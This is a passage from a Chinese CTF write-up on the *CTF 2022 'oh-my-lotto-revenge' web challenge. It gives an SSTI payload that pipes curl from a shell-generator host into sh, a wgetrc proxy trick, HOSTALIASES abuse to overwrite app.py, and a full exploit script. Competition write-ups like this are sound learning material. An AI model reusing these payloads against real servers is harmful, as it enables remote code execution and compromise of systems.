class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">r = requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><h4 id="非预期一：利用wgetrc的http-proxy配合ouput-document，写ssti到本地的templates目录"><a href="#非预期一：利用wgetrc的http-proxy配合ouput-document，写ssti到本地的templates目录" class="headerlink" title="非预期一：利用wgetrc的http_proxy配合ouput_document，写ssti到本地的templates目录"></a>非预期一：利用wgetrc的http_proxy配合ouput_document，写ssti到本地的templates目录</h4><p>forecast.txt：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http_proxy = http://<span class="number">39.106</span><span class="number">.87</span><span class="number">.143</span>:<span class="number">8888</span></span><br><span class="line">output_document = templates/index.html</span><br><span class="line"></span><br><span class="line">ps:</span><br><span class="line">output_document = file</span><br><span class="line"><span class="type">Set</span> the output filename—the same <span class="keyword">as</span> ‘-O file’.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">注意到官方的wp解释：wget请求添加了--content-disposition -N (new) 参数，说明请求的保存文件名将由服务方提供方指定的文件名决定，并可以覆盖原有的</span><br><span class="line">文件这里为什么还要用output_document呢？是因为--content-disposition -N参数虽然可以进行覆盖但是不能跨目录覆盖</span><br></pre></td></tr></table></figure><p>那又为什么要进行跨目录覆盖呢，官方的解释：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">题目使用gunicorn部署，app.py在改变的情况下并不会实时加载。但gunicorn使用一种pre-forked worker的机制，当某一个worker超时以后，就会让gunicorn重启该worker</span><br></pre></td></tr></table></figure><p>vps上的index.html：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;curl https://www.your-shell.com/39.106.87.143:8888 |sh&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">      r = f.read()</span><br><span class="line">      response = make_response(r)</span><br><span class="line">      response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">      response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=index.html&#x27;</span></span><br><span class="line">      <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>操作跟上面的就一样了，这里就不写了</p><h4 id="非预期二：利用WGETRC配合http-proxy和output-document，覆盖本地的wget应用，然后利用wget完成RCE。"><a href="#非预期二：利用WGETRC配合http-proxy和output-document，覆盖本地的wget应用，然后利用wget完成RCE。" class="headerlink" title="非预期二：利用WGETRC配合http_proxy和output_document，覆盖本地的wget应用，然后利用wget完成RCE。"></a>非预期二：<strong>利用</strong><code>WGETRC</code>配合<code>http_proxy</code>和<code>output_document</code>，覆盖本地的wget应用，然后利用wget完成RCE。</h4><p>这个复现意义不大这里就说了</p><h2 id="官方通杀wp："><a href="#官方通杀wp：" class="headerlink" title="官方通杀wp："></a>官方通杀wp：</h2><p>翻阅Linux环境变量文档<code>http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html</code>中的Network Settings发现HOSTALIASES可以设置shell中的hosts文件，利用hosts文件解析lotto到我们自己添加的域名，然后覆盖掉app.py</p><p>这里没有域名的还可以使用之前的WGETRC的http_proxy，然后通让覆盖掉app.py</p><p>同样的即使是覆盖掉了app.py但是不进行加载的，就无法进行rce怎么办？</p><p>这里因为worker的数量较小，可以直接令其超时重新加载</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span></span><br></pre></td></tr></table></figure><p><strong>最终worker重新加载</strong><code>app.py</code>，就可以完成RCE了，读取flag即可。参考官方完整POC如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://124.223.208.221:53000/&#x27;</span></span><br><span class="line">url_upload = base_url + <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = s.post(url=url_upload, proxies=proxies, files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;hosts&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">url_env = base_url + <span class="string">&#x27;lotto&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;lotto_key&#x27;</span>: <span class="string">&#x27;HOSTALIASES&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lotto_value&#x27;</span>: <span class="string">&#x27;/app/guess/forecast.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url=url_env, data=data)</span><br><span class="line"></span><br><span class="line">subprocess.Popen(<span class="string">&#x27;./exploit.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># os.system(&#x27;./exploit.sh&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">53</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url_shell = base_url + <span class="string">&#x27;test?a=env&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url_shell)</span><br><span class="line">    r = s.get(url_shell)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;*ctf&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
